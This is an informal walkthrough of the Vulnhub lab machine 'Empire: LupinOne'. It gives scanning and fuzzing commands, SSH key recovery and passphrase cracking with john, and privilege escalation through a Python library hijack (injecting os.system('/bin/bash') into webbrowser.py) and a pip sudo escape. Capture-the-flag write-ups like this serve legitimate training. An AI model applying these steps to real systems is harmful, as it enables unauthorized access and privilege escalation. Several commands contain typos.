Vulnhub - Empire: LupinOne Walkthrough

Youtube Video Link: https://www.youtube.com/watch?v=Sqj7tJ8Oth8&list=PL_Bj4ZvhLa37QWivDC6chQTanrxqdjWrh&index=3

Lets start by finding the IP address of the machine
$sudo arp-scan -l

$nmap -sC -sV -p- <ip_vulnerablemachine>
you will get three ports open 22, 80

now use gobuster scan
$gobuster dir -u http://<ip_vulnmachine> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php

you will get relevant files
/index.html
/robots.txt

go to the url
check robots.txt

check myfiles

now lets use wfuzz
$wfuzz -u "jttp://<ip_vulnmachine/~FUZZ/>" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 31

you will be able ot see secret file
you will get the message

you will be able to crack this using fasttrack

$head /usr/share/wordlist/fasttrack.txt

now lets find out the files
$ffuf -u "http://<ip_vulnmachine>/~secret/.FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt, .pub --mc 200

you will get the file mysecret.txt

use the text, and go to cyberchef, which is base58

$echo "textdecoded" > id_rsa

give the permission to the file
$chmod 700 id_rsa

$ssh icex64@<ip_vulnmachine> -i id_rsa

you will not be able to login so you can crack the password
use ssh2john

$python3 ssh2johnpy id_rsa > hash
$john --wordlist=/usr/share/wordlists/fasttrack.txt hash

you will get the password, use this to login
$ssh ice64@<ip_vulnmachine>

$sudo -l
you can run a file heist.py

get the user flag as well

take a look at the file heist.py
it uses a library webbrowser
locate the library, and edit this file

$locate webbrowser
$vi /usr/lib/python3.9/webbrowser.py

you have to add the lines

os.system("/bin/bash")

now when you run the file you will be able to get the new user shell

$sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py

$sudo -l

running pip from the user
use gtfobin
use the sudo 

after this you will get the root and can cat root.txt
